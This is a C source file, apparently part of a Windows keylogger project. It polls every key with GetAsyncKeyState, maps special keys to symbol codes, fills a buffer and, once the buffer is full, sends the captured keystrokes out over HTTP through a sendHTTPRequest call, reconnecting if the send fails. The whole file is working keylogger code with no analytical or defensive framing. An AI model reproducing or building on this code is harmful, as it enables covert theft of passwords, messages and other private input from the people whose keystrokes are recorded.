#include "../include/monitoring.h"
#include "../include/connect.h"
#include "../include/sendoverhttp.h"

bool checkFunctionalKeys(int key, char* buffer, bool* capsLockState) {

    switch (key)
    {
    case VK_RETURN:
        appendToEnd(buffer, '>');
        return true;
    case VK_TAB:
        appendToEnd(buffer, '^');
        return true;
    case VK_CAPITAL:
        appendToEnd(buffer, '*');
        *capsLockState = !(*capsLockState);
        return true;
    case VK_ESCAPE:
        appendToEnd(buffer, '?');
        return true;
    case VK_BACK:
        appendToEnd(buffer, '-');
        return true;
    case VK_SHIFT:
        appendToEnd(buffer, ':');
        return true;
    case VK_CONTROL:
        appendToEnd(buffer, ';');
        return true;
    case VK_MENU:
        appendToEnd(buffer, '#');
        return true;
    case VK_SPACE:
        appendToEnd(buffer, ' ');
        return true;
    case VK_NUMPAD0:
        appendToEnd(buffer, '0');
        return true;
    case VK_NUMPAD1:
        appendToEnd(buffer, '1');
        return true;
    case VK_NUMPAD2:
        appendToEnd(buffer, '2');
        return true;
    case VK_NUMPAD3:
        appendToEnd(buffer, '3');
        return true;
    case VK_NUMPAD4:
        appendToEnd(buffer, '4');
        return true;
    case VK_NUMPAD5:
        appendToEnd(buffer, '5');
        return true;
    case VK_NUMPAD6:
        appendToEnd(buffer, '6');
        return true;
    case VK_NUMPAD7:
        appendToEnd(buffer, '7');
        return true;
    case VK_NUMPAD8:
        appendToEnd(buffer, '8');
        return true;
    case VK_NUMPAD9:
        appendToEnd(buffer, '9');
        return true;
    default:
        return false;
    }
}

bool capsLockPressed() {
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
        return true;
    }
    else {
        return false;
    }
}

void appendToEnd(char* buffer, char data) {
    int length = strlen(buffer);

    if (length >= BUFF_SIZE) {
        if (sendHTTPRequest(buffer)) {
            buffer[0] = '\0';
        }
        else {
            printf("Error occured, trying to reconnect.");
            initializeConnection();
        }

    }
    else {
        buffer[length] = data;
        buffer[length + 1] = '\0';
    }

}

void startMonitorKeyStrokes() {
    char buffer[BUFF_SIZE] = "";
    bool capsLockState = capsLockPressed();

    while (1) {
        Sleep(10);
        for (int i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                if (checkFunctionalKeys(i, buffer, &capsLockState) == false) {
                    if (capsLockState == false && (i >= 65 && i <= 90)) {
                        appendToEnd(buffer, i + 32);
                    }
                    else {
                        appendToEnd(buffer, i);
                    }
                }
            }
        }
    }
}